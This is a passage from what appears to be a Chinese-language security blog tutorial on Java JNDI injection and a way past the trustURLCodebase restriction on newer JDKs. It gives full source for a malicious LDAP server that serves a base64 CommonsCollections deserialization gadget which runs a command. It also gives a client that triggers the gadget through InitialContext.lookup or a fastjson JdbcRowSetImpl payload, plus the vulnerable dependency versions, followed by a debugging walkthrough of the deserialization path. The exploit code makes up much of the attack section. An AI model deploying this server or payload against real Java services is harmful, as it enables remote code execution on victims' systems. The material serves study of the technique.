hyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=
```

恶意 LDAP 服务器如下，主要是在 javaSerializedData 字段内填入刚刚生成的反序列化 payload 数据：

JAVA

```
import com.unboundid.util.Base64;  
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPException;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.net.InetAddress;  
import java.net.MalformedURLException;  
import java.net.URL;  
import java.text.ParseException;  
  
public class JNDIGadgetServer {  
  
    private static final String LDAP_BASE = "dc=example,dc=com";  
  
  
 public static void main (String[] args) {  
  
        String url = "http://vps:8000/#ExportObject";  
 int port = 1234;  
  
  
 try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
 config.setListenerConfigs(new InMemoryListenerConfig(  
                    "listen",  
 InetAddress.getByName("0.0.0.0"),  
 port,  
 ServerSocketFactory.getDefault(),  
 SocketFactory.getDefault(),  
 (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  
 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
 System.out.println("Listening on 0.0.0.0:" + port);  
 ds.startListening();  
  
 }  
        catch ( Exception e ) {  
            e.printStackTrace();  
 }  
    }  
  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
  
        private URL codebase;  
  
  
 /**  
 * */ public OperationInterceptor ( URL cb ) {  
            this.codebase = cb;  
 }  
  
  
        /**  
 * {@inheritDoc}  
 * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  
 */ @Override  
 public void processSearchResult ( InMemoryInterceptedSearchResult result ) {  
            String base = result.getRequest().getBaseDN();  
 Entry e = new Entry(base);  
 try {  
                sendResult(result, base, e);  
 }  
            catch ( Exception e1 ) {  
                e1.printStackTrace();  
 }  
  
        }  
  
  
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {  
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));  
 System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);  
 e.addAttribute("javaClassName", "Exploit");  
 String cbstring = this.codebase.toString();  
 int refPos = cbstring.indexOf('#');  
 if ( refPos > 0 ) {  
                cbstring = cbstring.substring(0, refPos);  
 }  
  
            // Payload1: 利用LDAP+Reference Factory  
//            e.addAttribute("javaCodeBase", cbstring);  
//            e.addAttribute("objectClass", "javaNamingReference");  
//            e.addAttribute("javaFactory", this.codebase.getRef());  
  
 // Payload2: 返回序列化Gadget  
 try {  
                e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="));  
 } catch (ParseException exception) {  
                exception.printStackTrace();  
 }  
  
            result.sendSearchEntry(e);  
 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
 }  
  
    }  
}
```

服务端，客户端都加上依赖

XML

```
<dependency>  
 <groupId>com.alibaba</groupId>  
 <artifactId>fastjson</artifactId>  
 <version>1.2.80</version>  
</dependency>
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.2.1</version>  
</dependency>
```

客户端代码，这里有两种触发方式，选一种就好了，我这里 fastjson 还没学过，就先用第一种的 lookup 注入。

JAVA

```
import com.alibaba.fastjson.JSON;  
  
import javax.naming.Context;  
import javax.naming.InitialContext;  
  
public class JNDIGadgetClient {  
    public static void main(String[] args) throws Exception {  
        // lookup参数注入触发  
 Context context = new InitialContext();  
 context.lookup("ldap://localhost:1234/ExportObject");  
  
 // Fastjson反序列化JNDI注入Gadget触发  
 String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";  
 JSON.parse(payload);  
 }  
}
```

效果如图

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/Gadget.png)

##### 调试分析运行流程

- 先简单说一说是怎么调试的吧，我觉得断点调试这个完全可以自己手动调试，到了很迷茫看不懂的时候再去看其他师傅的文章比较好。

因为我们这里是 ldap 服务的 `lookup()` 方法的调用，前文我说每一个服务都对应一个 `xxxContext`，所以我们要先去找那个对应的 `xxxContext`，再去找 `decodeObject()` 方法。

所以这里的断点就正常调就行，`decodeObject()` 方法的是在 `decodeObject:235, Obj (com.sun.jndi.ldap)` 这个地方，可以现在这里打个断点节约时间，也可以自己跟一遍。如果自己跟一遍的话，是要通过 `p_lookup` 和 `c_lookup()` 进来的，因为在这之前都没到 `xxxContext`

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ObjDecodeObject.png)

进到 `decodeObject()` 方法里面，往下走，看到一个 `getURLClassLoader()` 这里方法里面。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getURLClassLoader.png)

往下走，进入到 `trustURLCodebase` 的判断，我们之前说过，这里默认就是 false，所以没跳进去，无法进行 URLClassLoader 的实例化。但是这个地方其实我们已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/trustURLCodebase.png)

这里实例化不通过是不会加载字节码进行命令执行的，我们继续往下走，有一个 `deserializeObject()` 方法非常引人注目，根据意思，它一定是一个用来反序列化的方法。再查看一下这里被反序列化的东西，是一个 `javaSerializedData` 数据类型的类。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/deserializeObject.png)

跟进这个方法，遇到了我们无比倾心的 `readObject()` 方法，OK 至此，入口类的条件满足。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/readObject.png)

读取的字节码被反序列化出来的时候，字节码被加载，造成命令执行

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/CommandExec.png)

- 至此，调试过程结束。

##### 小结一下 LDAP Gadget 恶意加载字节码

其实是换了一种思路进行字节码的加载，通过 `deserializeObject()` 方法的反序列化来进行命令执行。

## 0x04 小结

对于 JNDI 的注入，最重要的是掌握 JNDI 通用注入，也就是 LDAP + Reference 这一个；在掌握了这个之后，理解高版本 jdk 的绕过也相对简单了。

## 0x05 参考资料

[https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1](https://www.mi1k7ea.com/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/#调试分析-1)
[https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x03-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6](https://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/#0x03-绕过高版本JDK（8u191-）限制)
https://www.bilibili.com/video/BV1P54y1Z7Lf?spm_id_from=333.999.0.0
[https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/](https://johnfrod.top/安全/高低jdk版本中jndi注入/)